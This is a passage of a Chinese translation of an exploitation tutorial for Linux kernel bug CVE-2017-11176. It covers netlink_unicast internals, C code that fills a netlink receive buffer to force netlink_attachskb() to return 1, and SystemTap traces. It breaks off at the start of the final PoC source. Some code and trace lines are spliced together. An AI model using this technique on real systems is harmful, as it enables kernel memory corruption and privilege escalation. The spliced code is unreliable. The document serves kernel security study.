@@ -1,0 +1,151 @@
+    int netlink_unicast(struct sock *ssk, struct sk_buff *skb,
+                u32 pid, int nonblock)
+        {
+          struct sock *sk;
+          int err;
+          long timeo;
+          skb = netlink_trim(skb, gfp_any());   // len;
+            kfree_skb(skb);
+            sock_put(sk);
+            return err;
+          }
+    [4]   err = netlink_attachskb(sk, skb, &timeo, ssk);
+          if (err == 1)
+            goto retry;
+          if (err)
+            return err;
+    [5]   return netlink_sendskb(sk, skb);
+        }
+在[0]处，sock_sndtimeo()根据nonblock参数设置 **timeo**
+（超时）的值。由于我们不想阻塞（nonblock>0），timeo将为零。 **msg- >msg_flags必须设置MSG_DONTWAIT**。
+在[1]处，根据pid获得receiver套接字“sk”。在下一节中会有说明，在通过netlink_getsockbypid()获得receiver套接字之前
+**需要先将其绑定** 。
+在[2]处，receiver套接字不能是“内核”套接字。如果一个netlink套接字
+设置了NETLINK_KERNEL_SOCKET标志，则它被标记为“内核”套接字，这些套接字通过netlink_kernel_create()函数创建。不幸的是，NETLINK_GENERIC协议就是其中之一。
+**所以需要将receiver套接字协议更改为NETLINK_USERSOCK** 。
+在[3]处，BPF套接字过滤器可能正在生效。但如果 **没有为receiver套接字创建任何BPF过滤器** ，则可以不用管它。
+在[4]处调用了netlink_attachskb()！在netlink_attachskb()中，确保执行下列路径之一：
+  * receiver缓冲区未满：调用skb_set_owner_r() -> 增加sk_rmem_alloc
+  * receiver缓冲区已满：netlink_attachskb()不阻塞直接返回-EAGAIN
+**可以知道何时接收缓冲区已满（只需要检查sendmsg()的错误代码）** 。
+最后，在[5]处调用netlink_sendskb()将skb添加到接收缓冲区列表中，并删除通过netlink_getsockbypid()获取的（receiver套接字）引用。好极了！:-)
+更新约束列表：
+  * **msg- >msg_flags**设置MSG_DONTWAIT
+  * receiver套接字必须在调用sendmsg()之前绑定
+  * receiver套接字必须使用 **NETLINK_USERSOCK** 协议
+  * 不要为receiver套接字定义任何BPF过滤器
+现在非常接近完整的PoC。只要绑定receiver套接字就好了。
+## 绑定receiver套接字
+与任何套接字通信一样，两个套接字可以使用“地址”进行通信。由于正在使用netlink套接字，在这里将使用“struct sockaddr_nl”类型：
+    struct sockaddr_nl {
+       sa_family_t     nl_family;  /* AF_NETLINK */
+       unsigned short  nl_pad;     /* Zero. */
+       pid_t           nl_pid;     /* Port ID. */
+       __u32           nl_groups;  /* Multicast groups mask. */
+    };
+由于不想成为“广播组”的一部分，因此nl_groups必须为0。这里唯一重要的字段是“nl_pid”。
+基本上， **netlink_bind()** 有两条路径：
+  * nl_pid不为0：调用 **netlink_insert()**
+  * nl_pid为0：调用 **netlink_autobind()** ，后者又调用netlink_insert()
+如果使用已分配的pid调用netlink_insert()将产生“-EADDRINUSE”错误。否则会在nl_pid和netlink套接字
+之间创建映射关系。即现在可以通过netlink_getsockbypid()获得netlink套接字。此外，
+**netlink_insert()会将套接字引用计数加1** 。在最后的PoC中这一点很重要。
+**NOTE** ：[第4部分](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html)将详细介绍“pid：netlink_sock”映射存储方式。
+虽然调用netlink_autobind()更自然一点，但我们实际上是通过不断尝试pid值（autobind的作用，找当前未使用的pid值）来模拟netlink_autobind功能（不知道为什么这样做...主要是懒...），直到bind()成功。这样做允许我们直接获取目标nl_pid值而不调用getsockname()，并且（可能）简化调试（不确定:-)）。
+译者注：本来应该nl_pid为0，然后调用bind的，但原文作者直接设置nl_pid为118然后不断递增尝试bind(),直到成功。netlink_autobind应该会获取当前未使用的pid值。
+## 整合
+确定所有执行路径花了很长时间，但现在是时候在exp中实现这一部分并最终达成目标： **netlink_attachskb()返回1** ！
+步骤：
+  * 创建两个AF_NETLINK套接字使用NETLINK_USERSOCK协议
+  * 绑定目标（receiver）套接字（最后它的接收缓冲区必须已满）
+  * [可选]尝试减少目标套接字的接收缓冲区（减少调用sendmsg()）
+  * sender套接字通过sendmsg()像目标套接字发送大量数据，直到返回EAGAIN错误
+  * 关闭sender套接字（不再需要）
+可以独立运行下面代码以验证一切正常：
+    static int prepare_blocking_socket(void)
+    {
+      int send_fd;
+      int recv_fd;
+      char buf[1024*10]; // should be less than (sk->sk_sndbuf - 32), you can use getsockopt()
+      int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF
+      struct sockaddr_nl addr = {
+        .nl_family = AF_NETLINK,
+        .nl_pad = 0,
+        .nl_pid = 118, // must different than zero
+        .nl_groups = 0 // no groups
+      };
+      struct iovec iov = {
+        .iov_base = buf,
+        .iov_len = sizeof(buf)
+      };
+      struct msghdr mhdr = {
+        .msg_name = &addr,
+        .msg_namelen = sizeof(addr),
+        .msg_iov = &iov,
+        .msg_iovlen = 1,
+        .msg_control = NULL,
+        .msg_controllen = 0,
+        .msg_flags = 0, 
+      };
+      printf("[ ] preparing blocking netlink socket\n");
+      if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK))  0)  // > sendmsg (3, 0x7ffe69f94b50, MSG_DONTWAIT)
+    (2768-2768) [uland] ==>> copy_from_user ()
+    (2768-2768) [uland] ==>> copy_from_user ()
+    (2768-2768) [uland] ==>> copy_from_user ()
+    (2768-2768) [netlink] ==>> netlink_sendmsg (kiocb=0xffff880006137bb8 sock=0xffff88002fdba0c0 msg=0xffff880006137f18 len=0x2800)
+    (socket=0xffff88002fdba0c0)->sk->sk_refcnt = 1
+    (2768-2768) [netlink] ==>> netlink_autobind (sock=0xffff88002fdba0c0)
+    (2768-2768) [netlink] > alloc_skb (priority=0xd0 size=?)
+    (2768-2768) [skb] ==>> skb_put (skb=0xffff88003d298840 len=0x2800)
+    (2768-2768) [skb] > memcpy_fromiovec (kdata=0xffff880006150000 iov=0xffff880006137da8 len=0x2800)
+    (2768-2768) [uland] ==>> copy_from_user ()
+    (2768-2768) [iovec] > netlink_unicast (ssk=0xffff880006173c00 skb=0xffff88003d298840 pid=0x76 nonblock=0x40)
+    (2768-2768) [netlink] ==>> netlink_lookup (pid=? protocol=? net=?)
+    (2768-2768) [sk] ==>> sk_filter (sk=0xffff88002f89ac00 skb=0xffff88003d298840)
+    (2768-2768) [sk] > netlink_attachskb (sk=0xffff88002f89ac00 skb=0xffff88003d298840 timeo=0xffff880006137ae0 ssk=0xffff880006173c00)
+    -={ dump_netlink_sock: 0xffff88002f89ac00 }=-    - sk = 0xffff88002f89ac00
+    - sk->sk_rmem_alloc = 0                               // sk_rcvbuf = 2312                                // sk_refcnt = 3
+    - nlk->state = 0
+    - sk->sk_flags = 100
+    -={ dump_netlink_sock: END}=-    (2768-2768) [netlink] sk_rmem_alloc = 10504                           // sk_rcvbuf = 2312                                // sk_refcnt = 3
+    - nlk->state = 0
+    - sk->sk_flags = 100
+    -={ dump_netlink_sock: END}=-    (2768-2768) [netlink] sk_rcvbuf）。下一次调用mq_attachskb()将返回1！**
+更新TODO列表：
+  * [DONE]使netlink_attachskb()返回1
+  * [DONE]exp线程解除阻塞
+  * [DONE]使第二次fget()调用返回NULL
+全部做完了？还差一点...
+# 最终PoC
+在最后三节中，编写用户态代码实现了触发漏洞所需的每个条件。在展示最终的PoC之前，还有一件事要做。
+netlink_insert()会增加套接字引用计数，所以在进入mq_notify()之前，套接字引用计数为2（而不是1），所以 **需要触发漏洞两次**
+！
+在触发漏洞之前，通过dup()产生新的fd来解锁主线程。需要dup()两次（因为旧的会被关闭），所以最后可以保持一个fd解除阻塞，另一个fd来触发漏洞。
+**"Show me the code!"**
+最终PoC（不要运行system tap）：
+    /*
+     * CVE-2017-11176 Proof-of-concept code by LEXFO.
+     *
+     * Compile with:
+     *
+     *  gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit
+     */
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    // ============================================================================
+    // ----------------------------------------------------------------------------    // ============================================================================
+    #define NOTIFY_COOKIE_LEN (32)
+    #define SOL_NETLINK (270) // from [include/linux/socket.h]
+    // ----------------------------------------------------------------------------    
